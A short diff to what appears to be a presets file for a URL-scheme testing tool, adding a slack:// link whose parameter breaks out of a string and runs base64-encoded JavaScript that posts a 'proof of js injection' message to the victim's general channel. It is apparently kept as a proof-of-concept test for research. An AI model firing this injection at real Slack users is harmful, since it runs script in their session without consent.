@@ -1551,6 +1551,10 @@
         ],
         "presets": [
             {
+                "description": "",
+                "value": "slack://test?team=1&a=');eval(atob('VFNTU0Iuc2VuZE1zZ0Zyb21Vc2VyKHdpbmRvdy5UUy5jaGFubmVscy5nZXRHZW5lcmFsQ2hhbm5lbCgpLmlkLCAiSGVsbG8sIEkgYW0gcHJvb2Ygb2YganMgaW5qZWN0aW9uIik7'));String('"
+            },
+            {
                 "description": "Opens man page",
                 "value": "x-man-page://1/man"
             }
